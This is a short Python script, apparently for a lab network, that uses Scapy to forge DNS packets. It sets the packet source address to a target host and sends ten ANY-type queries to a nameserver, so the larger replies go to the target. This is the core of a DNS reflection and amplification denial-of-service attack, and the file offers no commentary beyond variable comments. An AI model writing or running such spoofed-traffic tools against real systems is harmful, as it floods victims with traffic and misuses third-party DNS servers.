# !/usr/bin/env python

from scapy.all import *

target = "172.20.0.3"  # Target host
nameserver = "172.20.0.2"  # DNS server
domain = "google.com"  # Some domain name like "google.com" etc.

request_count = 10

ip = IP(src=target, dst=nameserver)
udp = UDP(dport=53)
dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname=domain, qtype=255))

request = (ip / udp / dns)

for _ in range(request_count):
    send(request)
